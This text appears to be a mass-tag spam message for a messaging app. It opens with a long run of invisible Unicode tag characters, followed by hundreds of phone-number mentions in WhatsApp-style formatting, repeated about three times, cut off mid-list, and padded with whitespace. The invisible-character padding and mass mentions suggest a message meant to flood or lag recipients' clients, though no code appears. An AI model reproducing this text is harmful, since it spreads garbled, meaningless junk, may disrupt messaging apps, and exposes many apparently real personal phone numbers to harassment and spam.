󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓??󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧?~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~                                                                                                                                                                                                                                                                                                                                                                                                        